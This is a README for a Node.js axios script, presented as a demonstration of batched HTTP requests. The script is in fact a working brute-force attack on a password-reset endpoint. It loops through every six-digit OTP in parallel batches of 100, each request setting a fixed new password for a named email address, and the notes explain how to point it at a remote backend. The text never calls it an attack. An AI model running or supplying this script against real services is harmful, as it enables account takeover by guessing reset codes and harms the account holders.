# Axios Password Reset Request

This project demonstrates how to use the `axios` library to send a batch of HTTP POST requests for password resets with OTPs. The script sends requests in parallel, iterating over a range of OTP values.

## Prerequisites

- Node.js and npm installed
- A backend server running on `http://localhost:3000` that handles the `/reset-Password` POST request
- A valid JWT token for authorization

## Setup

1. Clone the repository:

   git clone https://github.com/your-repo/project.git

2. Install dependencies:

   npm install axios

3. Make sure you have your backend server running at `http://localhost:3000`, and you are authorized with a valid JWT token.

## Code Explanation

### Importing Axios

The script uses `axios` to send HTTP requests. Axios is a popular promise-based HTTP client for Node.js and the browser.

import axios from 'axios';

### Function `sendRequest`

The `sendRequest` function is responsible for making the password reset request.

- **Request Body**: It sends a JSON payload containing an email, an OTP, and a new password.
  
- **Config**: The request configuration includes:
  - `method`: POST
  - `url`: `/reset-Password`
  - `headers`: Authorization with a Bearer token and content type as JSON
  - `maxBodyLength`: Allows large payloads (infinite size)

async function sendRequest(otp: string) {
    let data = JSON.stringify({
        "email": "tarunsharmakhurja10@gmail.com",
        "otp": otp,
        "newPassword": "123456789"
    });

    let config = {
        method: 'post',
        maxBodyLength: Infinity,
        url: 'http://localhost:3000/reset-Password',
        headers: { 
            'Authorization': 'Bearer <your-token>', 
            'Content-Type': 'application/json'
        },
        data : data
    };
    
    try {
        await axios.request(config);
    } catch(e) {
        console.log(e);
    }
}

### Function `main`

The `main` function generates OTPs in a loop, sending requests in batches of 100 to simulate OTP validation.

- **Batching**: It sends OTPs in a range from 99999 to 999999.
- **Concurrency**: Sends 100 requests concurrently using `Promise.all`.

javascript
async function main() {
    for (let i = 99999; i < 999999; i += 100) {
        const p = [];
        console.log(i);
        for (let j = 0; j < 100; j++) {
            p.push(sendRequest((i + j).toString()));
        }
        await Promise.all(p);
    }
}

### Running the Script

To run the script, execute:

node index.js


This will start sending requests with OTPs ranging from 99999 to 999999.

## Dependencies

- **axios**: For making HTTP requests

Install Axios using npm:

npm install axios

## Notes

- Ensure that you replace the authorization token (`Bearer <your-token>`) with a valid JWT token from your backend.
- This script is set to run with a local backend. Modify the `url` in the config if your backend is hosted remotely.

## License

This project is licensed under the MIT License.

Feel free to modify the `README` as per your project's requirements!
